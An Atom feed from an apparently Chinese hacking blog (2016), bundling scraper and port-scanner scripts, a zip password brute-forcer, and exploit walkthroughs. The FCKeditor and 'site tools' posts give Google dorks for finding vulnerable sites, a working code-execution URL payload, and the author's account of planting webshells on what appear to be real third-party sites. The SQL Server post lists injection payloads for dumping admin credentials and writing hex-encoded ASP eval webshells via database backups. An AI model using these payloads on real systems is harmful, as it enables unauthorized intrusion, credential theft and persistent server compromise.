<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>●(六儿)●</title>
  <subtitle>烟花再亮~也不及梦想</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2016-11-12T03:15:14.072Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>小六</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python工具之二级域名爆破</title>
    <link href="http://yoursite.com/2016/11/12/Python%E5%B7%A5%E5%85%B7%E4%B9%8B%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"/>
    <id>http://yoursite.com/2016/11/12/Python工具之二级域名爆破/</id>
    <published>2016-11-12T03:15:14.000Z</published>
    <updated>2016-11-12T03:15:14.072Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python工具之爬虫</title>
    <link href="http://yoursite.com/2016/11/12/Python%E5%B7%A5%E5%85%B7%E4%B9%8B%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2016/11/12/Python工具之爬虫/</id>
    <published>2016-11-12T03:14:59.000Z</published>
    <updated>2016-11-12T10:30:13.665Z</updated>
    
    <content type="html"><![CDATA[<p>这里小编展示三个爬虫的例子<br>1.爬取补天厂商列表<br>2.爬取网易新闻排行榜<br>3.爬取图片<br><a id="more"></a></p>
<h3 id="爬取补天厂商列表"><a href="#爬取补天厂商列表" class="headerlink" title="爬取补天厂商列表"></a>爬取补天厂商列表</h3><pre><code>from lxml import etree
import re,os,threading
import urllib.request

def message_info(page):
    dom=etree.HTML(page)#用html解析,保存成dom树
    title=dom.xpath(&apos;/html//td/a&apos;)#取出厂商的名称
    url=dom.xpath(&apos;/html//td[2]&apos;)#取出厂商url
    title_list=[]#初始化厂商名称的一个列表
    url_list=[]#初始化厂商url的一个列表
    new_list=[]#初始化厂商列表的一个列表
    for x in title:#将厂商名称逐条取出
        title_list.append(x.text)#插入到title_list这个列表中
    for y in url:#将厂商url逐条取出
        url_list.append(y.text) #插入到url_list这个列表中
    for k in range(len(title_list)):
        new_tuple=(title_list[k],url_list[k])#将title_list和url_list两个列表中对应位置的数据取出来(title,url)
        new_list.append(new_tuple)#插入到new_list这个新的列表中
    return(new_list,url_list)#将厂商列表和url列表返回

def save_path(path,fileName,message):
    if not os.path.exists(path): #判断path(补天)这个文件夹是否存在
        os.mkdir(path)#不存在就创建
    newFileName=fileName+&apos;.txt&apos;#拼接文件名(厂商列表.txt)存储在newFileName中
    newFile=os.path.join(path,newFileName)#拼接路径(补天/厂商列表.txt)存储在newFile中
    with open(newFile,&apos;a&apos;) as f:#打开newFile这个文件(补天/厂商列表.txt)存储在变量f中,用a是追加(每次写入不会清空)
        for s in message:#将厂商列表的内容逐行取出,message(也就是message_list)是一个列表,列表的每一个元素是个元组(title,url)
            f.write(&apos;%s %s\n&apos;%(s[0],s[1]))#s[0](title)和s[1](url)的内容写入到文件中

def save_url(path,fileName,message):
    if not os.path.exists(path):#判断path(补天)这个文件夹是否存在
        os.mkdir(path)#不存在就创建
    newFileName=fileName+&apos;.txt&apos;#拼接文件名(url列表.txt)存储在newFileName中
    newFile=os.path.join(path,newFileName)#拼接路径(补天/url列表.txt)存储在newFile中
    with open(newFile,&apos;a&apos;) as f:
        for s in message:#将厂商列表的内容逐行取出,message(也就是murl_list)是一个列表
            f.write(&apos;%s\n&apos;%s)#将列表的每一个元素写入到文件中

def Spider(url):
    message=urllib.request.urlopen(url)#解析url,返回的结果是内存地址
    html=message.read()#用read()读出内容,存到html这个变量中
    List=message_info(html)#调用message_info函数,函数返回的结果(new_list,url_list)这个元组存到List变量中
    message_list=List[0]#List[0]保存的是new_list(厂商列表)的内容
    url_list=List[1]#List[1]保存的是url_list(url列表)的内容
    message_path=u&apos;补天&apos;#要保存的文件夹名称
    message_fileName=u&apos;厂商列表&apos;#要保存的文件名称
    url_fileName=u&apos;URL列表&apos;#要保存的文件名称
    save_path(message_path,message_fileName,message_list)#调用save_path函数,保存厂商列表
    save_url(message_path,url_fileName,url_list)##调用save_url函数,保存url列表

if __name__ == &apos;__main__&apos;:
    for p in range(1,25):
        start_url=&apos;https://butian.360.cn/company/lists/page/&apos;+ str(p)#循环补天厂商列表的页数
        Spider(start_url)
</code></pre><p>###爬取网易新闻排行榜</p>
<pre><code>from lxml import etree
import re,urllib,os
import requests

def save_path(path,fileName,message):

    if not os.path.exists(path):#判断path文件夹是否存在,如果不存在则创建
        os.mkdir(path)
    newFileName=fileName+&apos;.txt&apos;#拼接存储文件的路径
    newFile=os.path.join(path,newFileName)        #拼接存储文件的路径(获取的是存储数据文件的绝对路径)
    with open(newFile,&apos;w+&apos;,encoding=&apos;utf-8&apos;) as f:#将列表message写入本地
        for s in message:
            f.write(&apos;%s %s&apos;%(s[0],s[1]))

def message_info(page):#这个函数的作用是解析新闻排行榜的子标题
    message_info=re.findall(&apos;&lt;div class=&quot;titleBar&quot; id=&quot;.*?&quot;&gt;&lt;h2&gt;(.*?)&lt;/h2&gt;&lt;div class=&quot;more&quot;&gt;&lt;a href=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&apos;,page,re.S)#re模块是Python中的正则表达式模块#re.findall表示通过正则获取数据,获取匹配到的所有字符
    return message_info

def page_info(page):

    dom=etree.HTML(page)#etree.HTML解析HTML的函数
    title=dom.xpath(&apos;//tr/td/a/text()&apos;)#dom.xpath()在HTML中查找标签的函数
    url=dom.xpath(&apos;//tr/td/a/@href&apos;)#找tr标签中的td,td中的a标签,a标签中的href内容
    new_list=[]
    for x in range(len(title)):
        new_tuple=(title[x],url[x])
        new_list.append(new_tuple)
    return(new_list)

def Spider(url):
    message=requests.get(url).content.decode(&apos;gbk&apos;)#requests.get 做url请求,content 获取请求内容,decode 做gbk的编码
    message_List=message_info(message)
    message_path=u&apos;网易新闻排行榜&apos;
    message_fileName=u&apos;网易新闻排行榜&apos;
    save_path(message_path,message_fileName,message_List)
    for item,url in message_List:
        new_message=requests.get(url).content.decode(&apos;gbk&apos;)
        new_message_list=page_info(new_message)
        save_path(message_path,item,new_message_list)

if __name__ == &apos;__main__&apos;:
    start_URL=&apos;http://news.163.com/rank/&apos;
    Spider(start_URL)
</code></pre><p>###爬取图片</p>
<pre><code>import urllib.request
from lxml import etree
import os
def callbackfunc(blocknum, blocksize, totalsize):  
    &apos;&apos;&apos;
    @blocknum: 已经下载的数据块 
    @blocksize: 数据块的大小 
    @totalsize: 远程文件的大小 
    &apos;&apos;&apos;  
    percent = 100.0 * blocknum * blocksize / totalsize  
    if percent &gt; 100:  
        percent = 100  
    print (&quot;%.2f%%&quot;% percent)  


def Spider(url):
    image=urllib.request.urlopen(url)#获取目标网站的url
    html=image.read()#读取url
    image_list=image_info(html)#调用image_info函数
    for x in image_list:#将获取到的图片的url逐个取出
        local=x.split(&apos;/&apos;)#将取出的url用/分割
        if not os.path.exists(&apos;image&apos;):#当前目录下如果没有存在image这个文件夹
            os.mkdir(&apos;image&apos;)#创建该目录
        name=&apos;image/&apos;+local[-1]#拼接存储路径,保存的图片的名字为url用/分割后的最后一个元素
        urllib.request.urlretrieve(x,name,callbackfunc)#用urllib.request.urlretrieve()方法,直接将远程数据下载到本地,第一个参数为图片的url,第二个参数为存储地址,参数 callbackfunc 是一个回调函数，当连接上服务器、以及相应的数据块传输完毕时会触发该回调，我们可以利用这个回调函数来显示当前的下载进度

def image_info(html):
    dom=etree.HTML(html)#将读取到的内容解析成dom树
    url=dom.xpath(&apos;//img/@src&apos;)#选取该页面所有的图片的url
    return url

if __name__ == &apos;__main__&apos;:
    url = &apos;http://www.colg.cn/index/detail/7624&apos;  
    Spider(url)
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里小编展示三个爬虫的例子&lt;br&gt;1.爬取补天厂商列表&lt;br&gt;2.爬取网易新闻排行榜&lt;br&gt;3.爬取图片&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Python工具之Nmap端口扫描器</title>
    <link href="http://yoursite.com/2016/11/07/Python%E5%B7%A5%E5%85%B7%E4%B9%8BNmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>http://yoursite.com/2016/11/07/Python工具之Nmap端口扫描器/</id>
    <published>2016-11-07T07:55:16.000Z</published>
    <updated>2016-11-12T03:10:57.077Z</updated>
    
    <content type="html"><![CDATA[<p>只能进行TCP连接扫描的脚本有些不实用,因为我们可能还要进行其他类型的扫描,如ACK,FIN等.所以升级了我们的端口扫描器,使用nmap进行端口扫描.<br><a id="more"></a></p>
<pre><code>#coding:utf-8
import optparse,threading,multiprocessing,nmap
from socket import * #把socket下的所有名字引入当前名称空间

def nmapscan(tgtHost,tgtPost):
    nmscan=nmap.PortScanner()
    nmscan.scan(tgtHost,tgtPost)
    state=nmscan[tgtHost][&apos;tcp&apos;][int(tgtPost)][&apos;state&apos;]
    print(&apos;[*] &apos;+tgtHost+&apos; tcp/&apos;+tgtPost+&apos; &apos;+state)


def main():
    parser=optparse.OptionParser(&apos;请输入正确的参数：-H &lt;target host&gt; -p &lt;target post&gt;&apos;)
    parser.add_option(&apos;-H&apos;,dest=&apos;tgtHost&apos;,type=&apos;string&apos;,help=&apos;指定目标的主机地址&apos;)
    parser.add_option(&apos;-p&apos;,dest=&apos;tgtPost&apos;,type=&apos;string&apos;,help=&apos;指定目标的端口号&apos;)
    (options,args)=parser.parse_args()
    tgtHost=options.tgtHost
    if &apos;,&apos;in options.tgtPost:#如果用户输入的端口号列表中有逗号，说明是不连续的端口号
        tgtPosts=str(options.tgtPost).split(&apos;,&apos;)#用逗号分割
        if (tgtHost == None) or (tgtPosts[0] == None):#目标主机地址为空，或者端口号列表的第一个元素为空
            print(parser.usage)#输出提示信息
            exit(0)#结束程序
        for tgtPost in tgtPosts:#端口号不为空，则逐个取出
            nmapscan(tgtHost,tgtPost)#调用nmapscan函数
    elif &apos;-&apos; in options.tgtPost:#如果用户输入的端口号列表中有- 说明是连续的端口号
        first_tgtPosts=str(options.tgtPost).split(&apos;-&apos;)[0]#以-分割的的索引为0的元素是连续端口号的第一个端口（1-80）
        last_tgtPosts=str(options.tgtPost).split(&apos;-&apos;)[1]#以-分割的的索引为1的元素是连续端口号的最后一个端口
        if (tgtHost == None) or (first_tgtPosts == None) or (last_tgtPosts == None):
            print(parser.usage)
            exit(0)    
        for tgtPost in range(int(first_tgtPosts),int(last_tgtPosts)+1):#将连续的端口号逐个取出
            nmapscan(tgtHost,str(tgtPost))    
    tgtPosts=str(options.tgtPost)#如果用户输入的端口号列表中没有，和-  说明用户只想扫描一个端口
    if (tgtHost == None) or (tgtPosts == None):
        print(parser.usage)
        exit(0)
    nmapscan(tgtHost,tgtPosts)        


if __name__==&apos;__main__&apos;:
    main()
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;只能进行TCP连接扫描的脚本有些不实用,因为我们可能还要进行其他类型的扫描,如ACK,FIN等.所以升级了我们的端口扫描器,使用nmap进行端口扫描.&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Python工具之TCP全连接端口扫描器</title>
    <link href="http://yoursite.com/2016/11/07/Python%E5%B7%A5%E5%85%B7%E4%B9%8BTCP%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>http://yoursite.com/2016/11/07/Python工具之TCP全连接端口扫描器/</id>
    <published>2016-11-07T07:54:52.000Z</published>
    <updated>2016-11-12T02:56:46.194Z</updated>
    
    <content type="html"><![CDATA[<p>使用TCP全连接扫描来识别主机的TCP端口扫描器</p>
<a id="more"></a>
<pre><code>#coding:utf-8
import optparse,threading,multiprocessing
from socket import * #把socket下的所有名字引入当前名称空间

screenLock=multiprocessing.Semaphore(value=1)
def portscan(tgtHost,tgtPosts):
    try:
        tgtIP=gethostbyname(tgtHost)#gethostbyname()返回的是主机名的IPv4 的地址格式

    except:
        print(&apos;cannot resolve %s: unknown host&apos;%tgtHost)
        return
    try:    
        tgtName=gethostbyaddr(tgtIP)#gethostbyaddr()根据ip地址反向查找主机名称,返回的结果保存成一个列表，第一个元素是主机名称
        print(&apos;Scan results for:&apos;+ tgtName[0])
    except:
        print(&apos;Scan results for:&apos;+ tgtIP)#如果没有查到主机名称，则输出ip
    setdefaulttimeout(1)#访问超时设置
    for tgtPost in tgtPosts:#将要扫描的端口号的列表逐行取出
        thread=threading.Thread(target=connscan,args=(tgtHost,int(tgtPost)))
        thread.start()


def connscan(tgtHost,tgtPost):
    try:
        connskt=socket(AF_INET,SOCK_STREAM)#创建socket对象，AF_INET表示ipv4协议，SOCK_STREAM表示使用TCP
        connskt.connect((tgtHost,tgtPost))
        connskt.send(&apos;test&apos;)#dend()发送TCP数据,将string中的数据发送到连接的套接字
        result=connskt.recv(100)#recv接受TCP套接字的数据。数据以字符串形式返回，参数指定要接收的最大数据量
        screenLock.acquire()#因为是多线程允许，如果同时打印文字会使得文字混乱，acquire执行一个加锁的操作
        print(&apos;%d/tcp open&apos;%tgtPost)
        print(str(result))

    except:
        print(&apos;%d/tcp close&apos;%tgtPost)
    finally:#在异常处理代码中，位于finally关键字后的代码是终止阻塞其他线程之前需要执行的代码
        screenLock.release()#释放
        connskt.close()

def main():
    parser=optparse.OptionParser(&apos;请输入正确的参数：-H &lt;target host&gt; -p &lt;target post&gt;&apos;)
    parser.add_option(&apos;-H&apos;,dest=&apos;tgtHost&apos;,type=&apos;string&apos;,help=&apos;指定目标的主机地址&apos;)
    parser.add_option(&apos;-p&apos;,dest=&apos;tgtPost&apos;,type=&apos;string&apos;,help=&apos;指定目标的端口号&apos;)
    (options,args)=parser.parse_args()
    tgtHost=options.tgtHost
    if &apos;,&apos;in options.tgtPost:
        tgtPosts=str(options.tgtPost).split(&apos;,&apos;)
        if (tgtHost == None) or (tgtPosts[0] == None):
            print(parser.usage)
            exit(0)
        for tgtPost in tgtPosts:
            portscan(tgtHost,str(tgtPosts))
    elif &apos;-&apos; in options.tgtPost:
        first_tgtPosts=str(options.tgtPost).split(&apos;-&apos;)[0]
        last_tgtPosts=str(options.tgtPost).split(&apos;-&apos;)[1]
        if (tgtHost == None) or (first_tgtPosts == None) or (last_tgtPosts == None):
            print(parser.usage)
            exit(0)    
        for tgtPost in range(int(first_tgtPosts),int(last_tgtPosts)+1): 
            portscan(tgtHost,str(tgtPosts))
    tgtPosts=str(options.tgtPost).split(&apos; &apos;)#只扫描一个端口也要把该端口号当作一个列表传给portscan函数
    if (tgtHost == None) or (tgtPosts == None):
        print(parser.usage)
        exit(0)
    portscan(tgtHost,tgtPosts)

if __name__==&apos;__main__&apos;:
    main() #``
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用TCP全连接扫描来识别主机的TCP端口扫描器&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Python工具之zip文件口令破解机</title>
    <link href="http://yoursite.com/2016/11/07/Python%E5%B7%A5%E5%85%B7%E4%B9%8Bzip%E6%96%87%E4%BB%B6%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3%E6%9C%BA/"/>
    <id>http://yoursite.com/2016/11/07/Python工具之zip文件口令破解机/</id>
    <published>2016-11-07T07:54:28.000Z</published>
    <updated>2016-11-07T08:50:05.173Z</updated>
    
    <content type="html"><![CDATA[<p>zip文件口令破解,可以指定文件名和密码字典<br><a id="more"></a></p>
<pre><code>#coding:utf-8
import zipfile,threading,time,optparse

def breakzip(zfile,passwd):
    try:
        zfile.extractall(pwd=passwd)#extractall方法是用来解压zip文件的，如果是有密码的文件可以用pwd=指定密码       
        print(&apos;成功匹配到密码：{}&apos;.format(passwd))
    except Exception,e:#Exception是异常处理，将异常信息存在变量e中
        return

def main():
    parser=optparse.OptionParser(&apos;请输入正确的参数形式 -f &lt;zipfile&gt; -d &lt;dictionary&gt;&apos;)#创建一个optionparser的对象，参数在打印命令被调用时显示出来
    parser.add_option(&apos;-f&apos;,dest=&apos;zname&apos;,type=&apos;string&apos;,help=&apos;指定zip文件名&apos;)#add_option()用来添加选项，dest存储的变量，type类型，help帮助信息
    parser.add_option(&apos;-d&apos;,dest=&apos;dname&apos;,type=&apos;string&apos;,help=&apos;指定字典文件&apos;)
    (options,args)=parser.parse_args()#定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行
    #options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 
    #args，它是一个由 positional arguments 组成的列表。
    if (options.zname == None) or (options.dname == None):#如果没有指定参数
        print(parser.usage) #输出提示信息
        exit(0)
    else:
        zname=options.zname
        dname=options.dname
    zfile=zipfile.ZipFile(zname)
    passfile=open(dname)
    print(&apos;正在匹配密码，请等待...&apos;)
    for line in passfile.readlines():
        passwd=line.split(&apos;\n&apos;)[0]
        #breakzip(zfile, passwd)
        thread=threading.Thread(target=breakzip,args=(zfile,passwd))
        thread.start()

if __name__ == &apos;__main__&apos;:
    main()
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;zip文件口令破解,可以指定文件名和密码字典&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞之FCK编辑器</title>
    <link href="http://yoursite.com/2016/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B9%8BFCK%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    <id>http://yoursite.com/2016/10/31/文件上传漏洞之FCK编辑器/</id>
    <published>2016-10-31T06:39:01.000Z</published>
    <updated>2016-10-31T08:31:48.367Z</updated>
    
    <content type="html"><![CDATA[<p>fckeditor Version &lt;=2.4.2 For php 公开漏洞</p>
<a id="more"></a>
<h3 id="0x01-谷歌高级搜索-定位地区和关键词"><a href="#0x01-谷歌高级搜索-定位地区和关键词" class="headerlink" title="0x01 谷歌高级搜索 定位地区和关键词"></a>0x01 谷歌高级搜索 定位地区和关键词</h3><pre><code>inurl:fckeditor/editor
</code></pre><h3 id="0x02-查看他的fckeditor的版本信息"><a href="#0x02-查看他的fckeditor的版本信息" class="headerlink" title="0x02 查看他的fckeditor的版本信息"></a>0x02 查看他的fckeditor的版本信息</h3><p><img src="http://i.imgur.com/SZhs7DZ.png" alt=""></p>
<h3 id="0x03-查看该网站是解析asp还是php"><a href="#0x03-查看该网站是解析asp还是php" class="headerlink" title="0x03 查看该网站是解析asp还是php"></a>0x03 查看该网站是解析asp还是php</h3><p><img src="http://i.imgur.com/N561FbI.png" alt=""></p>
<h3 id="0x04-查找的fckeditor的公开漏洞"><a href="#0x04-查找的fckeditor的公开漏洞" class="headerlink" title="0x04 查找的fckeditor的公开漏洞"></a>0x04 查找的fckeditor的公开漏洞</h3><p>Version &lt;=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。<br>代码如下：</p>
<p><img src="http://i.imgur.com/oAjcdRn.png" alt=""></p>
<h3 id="0x05-打开这个HTML文件，上传文件"><a href="#0x05-打开这个HTML文件，上传文件" class="headerlink" title="0x05 打开这个HTML文件，上传文件"></a>0x05 打开这个HTML文件，上传文件</h3><p><img src="http://i.imgur.com/4Bel4da.png" alt=""></p>
<h3 id="0x06-上传成功后，查看网页源代码，找到上传路径"><a href="#0x06-上传成功后，查看网页源代码，找到上传路径" class="headerlink" title="0x06 上传成功后，查看网页源代码，找到上传路径"></a>0x06 上传成功后，查看网页源代码，找到上传路径</h3><p><img src="http://i.imgur.com/VS9I5Os.png" alt=""></p>
<p>我先上传了一个小马，又传了大马上去</p>
<p><img src="http://i.imgur.com/c6ash8e.png" alt=""></p>
<p><img src="http://i.imgur.com/U1nKf0v.png" alt=""></p>
<p>我还是很正义的在网站根目录下写了一个readme.txt~~~哈哈<br><img src="http://i.imgur.com/UbJzeYG.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;fckeditor Version &amp;lt;=2.4.2 For php 公开漏洞&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>代码执行漏洞之站长工具</title>
    <link href="http://yoursite.com/2016/10/30/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2016/10/30/代码执行漏洞之站长工具/</id>
    <published>2016-10-30T12:42:08.000Z</published>
    <updated>2016-10-31T06:49:42.657Z</updated>
    
    <content type="html"><![CDATA[<p>站长工具源码出现代码执行漏洞<br><a id="more"></a></p>
<h3 id="谷歌高级搜索"><a href="#谷歌高级搜索" class="headerlink" title="谷歌高级搜索"></a>谷歌高级搜索</h3><p>关键词：</p>
<pre><code>inurl:yb/yb.php

intitle:站长工具网

intitle:实用查询工具

inurl:yb/youbian.php

inurl:yb/youbian

inurl:yb/index.php
</code></pre><h3 id="测试选择的网站是否存在代码执行漏洞"><a href="#测试选择的网站是否存在代码执行漏洞" class="headerlink" title="测试选择的网站是否存在代码执行漏洞"></a>测试选择的网站是否存在代码执行漏洞</h3><p>在URL中输入</p>
<pre><code>http://www.xxx.xxx/yb/yb.php?q=${@exit(var_dump(file_put_contents($_GET[n],$_GET[d])))}&amp;d=haha&amp;n=./1.php
</code></pre><p><img src="http://i.imgur.com/vM2IAEX.png" alt=""></p>
<p>出现这种情况说明我们的字符是写进去啦，打开1.php验证一下</p>
<p><img src="http://i.imgur.com/5ny9WvO.png" alt=""></p>
<h3 id="开干啦"><a href="#开干啦" class="headerlink" title="开干啦~"></a>开干啦~</h3><p>接下来就是把小马写在d=的后面</p>
<p><img src="http://i.imgur.com/yDgd3kZ.png" alt=""></p>
<p>看看有没有写进去</p>
<p><img src="http://i.imgur.com/kxHiCKa.png" alt=""></p>
<p>什么都没出现，可能使代码执行了，拿出菜刀链接一下小马<br><img src="http://i.imgur.com/A52mOjH.png" alt=""></p>
<p>ok，连上啦，成功拿到shell</p>
<p><img src="http://i.imgur.com/7e86fjV.png" alt=""></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>未完待续……</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;站长工具源码出现代码执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>SQL server注入</title>
    <link href="http://yoursite.com/2016/10/09/SQL-server%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2016/10/09/SQL-server注入/</id>
    <published>2016-10-09T01:10:57.000Z</published>
    <updated>2016-10-09T01:42:37.278Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入攻击本质：把用户输入的数据当代码使用<br>攻击请求向量：分为GET POST Cookie<br>数据类型：整型，字符型，搜索型<br>显示数据方法：</p>
<ul>
<li>显错注入</li>
<li>盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）</li>
</ul>
<a id="more"></a>
<h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><p>interger：<br>id=1-0 正常<br>id=1-1  出错<br>string：<br>and ‘a’=’a’ 正常<br>and ‘a’=’b’ 出错</p>
<h4 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h4><p>and exists(select @@version)–</p>
<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>Order by 5 –     </p>
<h4 id="判断字段数据类型"><a href="#判断字段数据类型" class="headerlink" title="判断字段数据类型"></a>判断字段数据类型</h4><p>union all select NULL,NULL,NULL,NULL,NULL–<br>union all select NULL,NULL,’ test’ ,NULL,NULL–<br>正常说明第3字段为字符型可以显示SQL注入数据。</p>
<h4 id="显示数据库版本"><a href="#显示数据库版本" class="headerlink" title="显示数据库版本"></a>显示数据库版本</h4><p>and 1=2 union all select NULL,NULL,@@version,NULL,NULL–</p>
<h4 id="显示当前库名"><a href="#显示当前库名" class="headerlink" title="显示当前库名"></a>显示当前库名</h4><p>and 1=2 union all select NULL,db_name(),NULL,NULL,NULL from sysobjects–</p>
<h4 id="显示指定库的表名"><a href="#显示指定库的表名" class="headerlink" title="显示指定库的表名"></a>显示指定库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from 库名..sysobjects where xtype=’u’ and name not in(select top 0 name from 库名..sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–</p>
<h4 id="显示当前库的表名"><a href="#显示当前库的表名" class="headerlink" title="显示当前库的表名"></a>显示当前库的表名</h4><p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 0 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–    </p>
<p>and 1=2 union all select NULL,(select top 1 name from sysobjects where xtype=’u’ and name not in(select top 1 name from sysobjects where xtype=’u’)),NULL,NULL,NULL from sysobjects–<br>//查询表名(从0开始增加第二个top N的数字就可以遍历当前数据库表名了。</p>
<h4 id="显示字段名"><a href="#显示字段名" class="headerlink" title="显示字段名"></a>显示字段名</h4><p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–    </p>
<p>and 1=2 union all select NULL,(select top 1 name from syscolumns where id in (select id from sysobjects where name=’admin’) and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name=’admin’))),NULL,NULL,NULL from sysobjects–<br>从0开始增加第二个top N的数字就可以遍历admin表的字段名了</p>
<h4 id="显示字段值"><a href="#显示字段值" class="headerlink" title="显示字段值"></a>显示字段值</h4><p>and 1=2 union all select id,username,password,NULL,NULL from admin–</p>
<h4 id="webshell写入"><a href="#webshell写入" class="headerlink" title="webshell写入"></a>webshell写入</h4><p>数据库与 Web 分离判断：<br>网站主机名:select host_name(); 数据库主机名:select @@servername;<br>如果未分离可以写入 shell</p>
<h5 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h5><p>;DROP TABLE cmd–<br>;ALTER DATABASE 库名 SET RECOVERY FULL–<br>;CREATE TABLE cmd (a IMAGE)–<br>;BACKUP DATABASE 库名 TO DISK = ‘c:\progra~1\1.bak’ WITH INIT–<br>;INSERT INTO cmd (a) VALUES(0x3c256576616c207265717565737428224d482229253e)–<br>;BACKUP DATABASE 库名 TO DISK = ‘C:\Inetpub\wwwroot\shell.asp’–<br>;DROP TABLE cmd–</p>
<h5 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h5><p>;drop table cmd–<br>;backup database testdb to disk =’c:\progra~1\sq.bak’–<br>;create table cmd(a image)–<br>;insert into cmd(a) values(0x3c256576616c20726571756573742822746f6d2229253e)–<br>;backup database testdb to disk=’C:\Inetpub\wwwroot\sq.asp’ with differential,format–<br>;drop table cmd–</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sql注入攻击本质：把用户输入的数据当代码使用&lt;br&gt;攻击请求向量：分为GET POST Cookie&lt;br&gt;数据类型：整型，字符型，搜索型&lt;br&gt;显示数据方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;显错注入&lt;/li&gt;
&lt;li&gt;盲注（布尔注入，延时，报错，联合查询，堆查询，DNS查询）&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>webinspect扫描器</title>
    <link href="http://yoursite.com/2016/09/27/webinspect%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>http://yoursite.com/2016/09/27/webinspect扫描器/</id>
    <published>2016-09-27T13:34:40.000Z</published>
    <updated>2016-09-27T14:39:40.680Z</updated>
    
    <content type="html"><![CDATA[<p>目前，许多复杂的 Web 应用程序全都基于新兴的 Web 2.0 技术，HP WebInspect 可以对这些应用程序执行 Web 应用程序安全测试和评估。HP WebInspect 可提供快速扫描功能、广泛的安全评估范围及准确的 Web 应用程序安全扫描结果。它可以识别很多传统扫描程序检测不到的安全漏洞。利用创新的评估技术.<br><a id="more"></a></p>
